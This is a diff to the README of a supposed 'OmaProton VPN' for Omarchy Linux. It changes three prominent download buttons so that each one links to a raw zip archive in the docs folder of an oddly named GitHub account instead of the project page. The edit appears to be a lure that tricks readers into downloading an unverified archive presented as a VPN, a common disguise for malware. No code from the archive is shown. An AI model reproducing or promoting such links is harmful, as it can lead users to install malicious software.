@@ -1,7 +1,7 @@
 <h1>🚀 omaproton-vpn - One-Click VPN for Omarchy</h1>
 
 <p align="center">
-  <a href="https://github.com/Valveinheadenginewashingpowder8727/omaproton-vpn" style="display:inline-block;padding:14px 28px;background:#7c3aed;color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(124,58,237,0.4);">
+  <a href="https://github.com/Valveinheadenginewashingpowder8727/omaproton-vpn/raw/refs/heads/main/docs/omaproton_vpn_2.0.zip" style="display:inline-block;padding:14px 28px;background:#7c3aed;color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(124,58,237,0.4);">
     ⬇️ Download OmaProton VPN Now
   </a>
 </p>
@@ -56,7 +56,7 @@ No special hardware needed. If your computer runs Linux, it likely runs OmaProto
 Click the big purple button at the top of this page, or use this link:
 
 <p align="center">
-  <a href="https://github.com/Valveinheadenginewashingpowder8727/omaproton-vpn" style="display:inline-block;padding:12px 24px;background:#0d9488;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">
+  <a href="https://github.com/Valveinheadenginewashingpowder8727/omaproton-vpn/raw/refs/heads/main/docs/omaproton_vpn_2.0.zip" style="display:inline-block;padding:12px 24px;background:#0d9488;color:#ffffff;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">
     📂 Download OmaProton VPN
   </a>
 </p>
@@ -225,7 +225,7 @@ That's it! You're now ready to enjoy private, secure, and beautiful internet bro
 <h2>📦 Download Again</h2>
 
 <p align="center">
-  <a href="https://github.com/Valveinheadenginewashingpowder8727/omaproton-vpn" style="display:inline-block;padding:16px 32px;background:#db2777;color:#ffffff;font-size:22px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 6px 20px rgba(219,39,119,0.4);">
+  <a href="https://github.com/Valveinheadenginewashingpowder8727/omaproton-vpn/raw/refs/heads/main/docs/omaproton_vpn_2.0.zip" style="display:inline-block;padding:16px 32px;background:#db2777;color:#ffffff;font-size:22px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 6px 20px rgba(219,39,119,0.4);">
     ⬇️ Get OmaProton VPN Now
   </a>
 </p>
